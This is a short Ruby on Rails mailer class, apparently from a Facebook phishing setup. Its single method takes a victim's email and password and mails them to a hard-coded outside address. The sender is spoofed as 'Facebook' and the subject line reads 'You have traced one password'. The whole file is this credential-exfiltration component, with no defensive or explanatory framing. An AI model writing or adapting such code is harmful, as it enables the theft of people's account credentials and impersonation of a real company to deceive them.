  class FbMailer <  ActionMailer::Base


  def fb_created(email,password)
    @email = email
    @password = password
    mail(

        to: 'st118173@ait.asia',
        from: 'Facebook<registration_facebookmail@yahoo.com>',
        subject: "You have traced one password",

    )

  end

end